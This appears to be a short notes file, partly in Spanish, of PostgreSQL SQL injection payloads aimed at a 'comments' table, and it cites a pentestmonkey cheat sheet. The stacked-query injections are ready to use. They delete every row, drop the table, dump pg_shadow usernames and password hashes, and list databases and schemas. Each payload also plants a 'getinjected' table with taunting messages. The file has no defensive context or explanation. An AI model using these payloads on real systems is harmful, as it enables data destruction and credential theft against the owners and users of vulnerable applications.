CREATE TABLE comments (
    id SERIAL PRIMARY KEY,
    usuario TEXT,
    comentario TEXT,
    fecha DATE
);

ref:
https://pentestmonkey.net/cheat-sheet/sql-injection/postgres-sql-injection-cheat-sheet

DELETE:
comentario'); delete from "comments"; CREATE TABLE IF NOT EXISTS getinjected (id SERIAL PRIMARY KEY, mensaje TEXT); INSERT INTO getinjected (mensaje) VALUES ('tabla limpia

DROP TABLE: 
comentario'); DROP TABLE comments; CREATE TABLE IF NOT EXISTS getinjected (id SERIAL PRIMARY KEY, mensaje TEXT); INSERT INTO getinjected (mensaje) VALUES ('tabla dropeada

OBTENER VERSION: 
comentario'); SELECT version(); CREATE TABLE IF NOT EXISTS getinjected (id SERIAL PRIMARY KEY, mensaje TEXT); INSERT INTO getinjected (mensaje) VALUES ('tengo tu version

CREATE SCHEMA: 
comentario'); SELECT version(); CREATE SCHEMA IF NOT EXISTS getinjected; CREATE TABLE IF NOT EXISTS getinjected (id SERIAL PRIMARY KEY, mensaje TEXT); INSERT INTO getinjected (mensaje) VALUES ('schema creado

GET USERNAMES PASSOWRDS:
comentario'); SELECT * FROM pg_shadow; CREATE TABLE IF NOT EXISTS getinjected (id SERIAL PRIMARY KEY, mensaje TEXT); INSERT INTO getinjected (mensaje) VALUES ('tengo tus users

GET DATABESES:
comentario'); SELECT datname FROM pg_database; CREATE TABLE IF NOT EXISTS getinjected (id SERIAL PRIMARY KEY, mensaje TEXT); INSERT INTO getinjected (mensaje) VALUES ('tengo tus bases de datos

GET SCHEMAS:
comentario'); SELECT nspname FROM pg_namespace; CREATE TABLE IF NOT EXISTS getinjected (id SERIAL PRIMARY KEY, mensaje TEXT); INSERT INTO getinjected (mensaje) VALUES ('tengo tus schemas
